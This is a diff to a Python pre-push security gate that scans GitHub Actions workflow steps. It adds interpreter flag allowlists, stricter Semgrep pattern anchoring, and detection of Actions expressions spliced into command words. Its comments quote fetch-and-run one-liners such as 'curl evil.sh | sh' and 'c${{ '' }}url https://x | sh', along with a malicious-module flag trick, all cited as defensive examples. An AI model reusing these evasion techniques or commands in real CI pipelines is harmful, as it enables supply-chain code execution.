@@ -120,8 +120,28 @@ SEMGREP_PARTIAL_RULE_RE = re.compile(
 # and every entry widens the surface. A push using one blocks, which is the
 # correct direction for a security gate. Refs #3683, #3663.
 NON_BASH_INTERPRETERS = frozenset({"pwsh", "powershell", "python", "python3"})
-# `-NoProfile`, `-Command`, `-c`. A flag carries no interpreter of its own.
-SHELL_FLAG_TOKEN_RE = re.compile(r"^-{1,2}[A-Za-z][A-Za-z0-9-]*$")
+# Flags an interpreter accepts that provably carry no code of their own, keyed
+# by interpreter. An allowlist, because a flag is an execution vector: a generic
+# "looks like a flag" regex accepted `python3 -mevil {0}`, which runs the
+# attacker's module and ignores the workflow's own script, while the gate
+# treated the step as a reviewed non-Bash interpreter and skipped the Bash
+# rules. Verified against CPython.
+#
+# Python gets no flags at all. Every flag that changes what Python executes
+# (`-c`, `-m`) can be written without a separating space, so no prefix test
+# distinguishes them from the harmless ones; the repository only ever uses the
+# bare `python3 {0}` form, so permitting nothing else costs nothing.
+#
+# PowerShell's flags are matched case-insensitively because pwsh itself accepts
+# them that way. `-Command` is safe to name here only because its argument must
+# still match POWERSHELL_CALL_TOKEN_RE; any other argument text fails closed.
+# Refs #3683.
+SAFE_SHELL_FLAGS: dict[str, frozenset[str]] = {
+    "pwsh": frozenset({"-noprofile", "-nologo", "-noninteractive", "-command"}),
+    "powershell": frozenset({"-noprofile", "-nologo", "-noninteractive", "-command"}),
+    "python": frozenset(),
+    "python3": frozenset(),
+}
 # The script placeholder, bare or quoted.
 SHELL_PLACEHOLDER_TOKEN_RE = re.compile(r"^[\"']?\{0\}[\"']?$")
 # PowerShell's canonical custom-shell template invokes the script through the
@@ -129,6 +149,11 @@ SHELL_PLACEHOLDER_TOKEN_RE = re.compile(r"^[\"']?\{0\}[\"']?$")
 # Any other argument text is free to name a second interpreter.
 POWERSHELL_CALL_TOKEN_RE = re.compile(r"^[&.]\s*(?:'\{0\}'|\"\{0\}\"|\{0\})$")
 ACTIONS_EXPRESSION_RE = re.compile(r"\$\{\{.+?\}\}", re.DOTALL)
+# Text between the previous shell command separator and an expression. When that
+# text is a bare partial word, Actions splices the expanded value onto it and the
+# pair becomes one command word that no scanner saw. Refs #3673.
+SHELL_COMMAND_SEPARATOR_RE = re.compile(r"[\n;&|(]")
+PARTIAL_COMMAND_WORD_RE = re.compile(r"[\w./-]+")
 # `bash -n` parses without executing. A body it accepts is valid shell, so a
 # Semgrep sub-parse failure on it is Semgrep's limitation rather than evidence
 # the step is unscannable. A body it rejects is genuinely malformed, and an
@@ -2399,8 +2424,22 @@ def _semgrep_line_matches_pattern(
     # re-encodes them in its error text. A line made entirely of non-ASCII is
     # therefore all wildcard and matches any observed line of the same shape,
     # which let an all-non-ASCII decoy step claim an unrelated snippet. Require
-    # at least one ASCII anchor. Refs #3673.
-    if expected and not any(character.isascii() for character in expected):
+    # at least one ASCII anchor.
+    #
+    # Whitespace does not count as an anchor. Spaces are ASCII, so an earlier
+    # `isascii` test let `'\u2713 \u2713 \u2713'` satisfy the guard and then
+    # match `'curl evil.sh | sh'`: every non-ASCII run is a wildcard and the
+    # spaces align with the spaces in any ordinary command line. Only a
+    # printable, non-space ASCII character carries enough signal to tie the
+    # expected line to a specific snippet.
+    #
+    # Scoped to lines that actually carry a wildcard. A line of pure ASCII has
+    # none, so it matches exactly and needs no anchor; demanding one there would
+    # reject the blank interior line of an ordinary `run:` block. Refs #3673.
+    if any(not character.isascii() for character in expected) and not any(
+        character.isascii() and character.isprintable() and not character.isspace()
+        for character in expected
+    ):
         return False
     observed_index = 0
     expected_index = 0
@@ -2432,10 +2471,17 @@ def _semgrep_line_matches_pattern(
     return expected_index == len(expected)
 
 
-def _is_reviewed_shell_argument(token: str) -> bool:
+def _is_reviewed_shell_argument(token: str, interpreter: str) -> bool:
+    """Report whether ``token`` is safe to pass to ``interpreter``.
+
+    Safe means the token cannot itself name code to run. A flag qualifies only
+    when the interpreter's own allowlist names it, because a flag such as
+    ``-mevil`` or ``-c`` carries a payload while still looking like a flag.
+    """
+    if token.lower() in SAFE_SHELL_FLAGS.get(interpreter, frozenset()):
+        return True
     return bool(
-        SHELL_FLAG_TOKEN_RE.match(token)
-        or SHELL_PLACEHOLDER_TOKEN_RE.match(token)
+        SHELL_PLACEHOLDER_TOKEN_RE.match(token)
         or POWERSHELL_CALL_TOKEN_RE.match(token)
     )
 
@@ -2444,8 +2490,9 @@ def _is_non_bash_shell(shell: str | None) -> bool:
     """Report whether ``shell`` provably hands the step to a non-Bash interpreter.
 
     Allowlist, not blocklist: the token must be an exact interpreter name and
-    every remaining token must be a flag or the script placeholder. Anything
-    else, including unbalanced quoting, fails closed. Refs #3683.
+    every remaining token must be a placeholder or a flag that interpreter is
+    known to accept without carrying code. Anything else, including unbalanced
+    quoting, fails closed. Refs #3683.
     """
     if shell is None:
         return False
@@ -2455,7 +2502,10 @@ def _is_non_bash_shell(shell: str | None) -> bool:
         return False
     if not tokens or tokens[0] not in NON_BASH_INTERPRETERS:
         return False
-    return all(_is_reviewed_shell_argument(token) for token in tokens[1:])
+    interpreter = tokens[0]
+    return all(
+        _is_reviewed_shell_argument(token, interpreter) for token in tokens[1:]
+    )
 
 
 WINDOWS_BASH_FALLBACKS = (
@@ -2510,15 +2560,59 @@ def _body_is_valid_shell_syntax(run: str) -> bool:
     return result.returncode == 0
 
 
+def _splices_expression_into_command_word(run: str) -> bool:
+    """Report whether an Actions expression is glued onto a partial command word.
+
+    Actions substitutes ``${{ ... }}`` before Bash ever runs, so Semgrep and
+    every other static scanner read the pre-substitution text. Writing
+    ``c${{ '' }}url https://x | sh`` hides ``curl`` from the rules while Actions
+    reassembles the real command, and the resulting PowerShell parse error was
+    then excused as an expression false positive. Splitting a command word this
+    way has no legitimate use: all 17 expression-bearing Bash steps in this
+    repository place the expression in argument or string position instead.
+    Refs #3673.
+    """
+    for match in ACTIONS_EXPRESSION_RE.finditer(run):
+        preceding = SHELL_COMMAND_SEPARATOR_RE.split(run[: match.start()])[-1].lstrip()
+        # An empty segment means the expression is the whole command word, which
+        # raw-interpolation validation already covers, not this obfuscation.
+        if preceding and PARTIAL_COMMAND_WORD_RE.fullmatch(preceding):
+            return True
+    return False
+
+
 def _step_defeats_bash_subparse(shell: str | None, run: str) -> bool:
     if _is_non_bash_shell(shell):
         return True
     if not ACTIONS_EXPRESSION_RE.search(run):
         return False
+    if _splices_expression_into_command_word(run):
+        return False
     # An Actions expression explains a Bash sub-parse failure only when the body
     # is otherwise valid shell. Without this check, appending a deliberate syntax
     # error to a malicious script suppresses the finding and the error together.
     return _body_is_valid_shell_syntax(run)
+
+
+def _utf8_char_index_map(raw: bytes) -> dict[int, int] | None:
+    """Map every character-start byte offset in ``raw`` to its character index.
+
+    Built in one linear pass so a caller converting many offsets in the same
+    file does not re-decode a prefix per offset. Returns ``None`` when ``raw``
+    is not valid UTF-8 as a whole, which sends the caller back to the per-offset
+    path that can still resolve offsets inside a decodable prefix.
+    """
+    try:
+        text = raw.decode("utf-8")
+    except UnicodeDecodeError:
+        return None
+    mapping: dict[int, int] = {}
+    byte_offset = 0
+    for char_index, character in enumerate(text):
+        mapping[byte_offset] = char_index
+        byte_offset += len(character.encode("utf-8"))
+    mapping[byte_offset] = len(text)
+    return mapping
 
 
 def _byte_offset_to_char_index(raw: bytes, offset: int) -> int | None:
@@ -2529,6 +2623,10 @@ def _byte_offset_to_char_index(raw: bytes, offset: int) -> int | None:
     file holding multibyte content, so the containment test read the wrong
     region. An offset that lands mid-character returns ``None`` and the caller
     drops the span, which blocks the push. Refs #3672.
+
+    Decoding a fresh prefix per call is quadratic in the file size. Callers
+    converting more than one offset from the same file should build the map once
+    with :func:`_utf8_char_index_map` instead. Refs #3673.
     """
     if offset < 0 or offset > len(raw):
         return None
@@ -2559,6 +2657,10 @@ def _powershell_partial_parsing_spans(
     locations = error_type[1]
     if not isinstance(locations, list):
         return []
+    # One pass over the file, not one decode per offset. Semgrep can report many
+    # locations for a single PartialParsing error, and each conversion used to
+    # re-decode the whole prefix. Refs #3673.
+    char_index_map = _utf8_char_index_map(raw)
     spans: list[tuple[int, int, int, int]] = []
     for location in locations:
         if not isinstance(location, dict):
@@ -2607,8 +2709,12 @@ def _powershell_partial_parsing_spans(
             or (end_line == start_line and end_col < start_col)
         ):
             return []
-        start_index = _byte_offset_to_char_index(raw, start_offset)
-        end_index = _byte_offset_to_char_index(raw, end_offset)
+        if char_index_map is None:
+            start_index = _byte_offset_to_char_index(raw, start_offset)
+            end_index = _byte_offset_to_char_index(raw, end_offset)
+        else:
+            start_index = char_index_map.get(start_offset)
+            end_index = char_index_map.get(end_offset)
         if start_index is None or end_index is None:
             return []
         spans.append((start_line, end_line, start_index, end_index))
